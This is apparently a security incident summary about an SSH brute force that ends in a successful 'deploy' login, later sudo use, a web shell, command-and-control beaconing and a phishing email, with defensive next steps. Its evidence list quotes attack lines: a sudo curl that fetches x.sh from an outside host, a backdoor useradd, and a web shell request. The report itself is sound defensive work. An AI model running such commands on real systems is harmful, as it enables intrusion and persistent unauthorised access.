Summary

203.0.113.45 made 22 failed SSH logins against web01 within a few minutes (including several non-existent usernames), then logged in successfully as 'deploy'. Shortly afterwards the account ran curl and useradd through sudo, a web shell was requested from the same IP, and web01 began beaconing to 198.51.100.77 on port 4444. Both IPs are on the local blocklist. A separate phishing email, a password spray and a distributed attack on 'admin' were also detected.

Evidence

  • Brute force with success - A successful login for 'deploy' from the same IP followed at 2026-10-28T02:17:28Z. The attacker may now have a valid account.
  • Suspicious privileged commands - sudo curl http://198.51.100.77/x.sh and sudo useradd support2 by user deploy
  • Web shell - GET /uploads/shell.php?cmd=id from the attacker IP
  • Command-and-control beaconing - 6 outbound connections to 198.51.100.77:4444 about 5 minutes apart
  • Phishing email - 02_phish_paypal_lookalike.eml scored 100/100 (CRITICAL)

Recommended next steps

  1. Block the attacking IP(s) at the firewall.
  2. If a login succeeded: disable the account, reset its credentials and review everything it did.
  3. Enforce MFA and account lockout; disable password SSH where possible.
  4. Contact the user through a separate channel to confirm the login.
  5. If not confirmed: revoke sessions, reset the password and re-register MFA.
  6. Review mailbox rules and recent activity for the account.
  7. Quarantine or delete the message from all mailboxes.
  8. Block the sender domain and any malicious links at the proxy or mail gateway.
  9. Check who clicked or replied; reset credentials for anyone who entered a password.
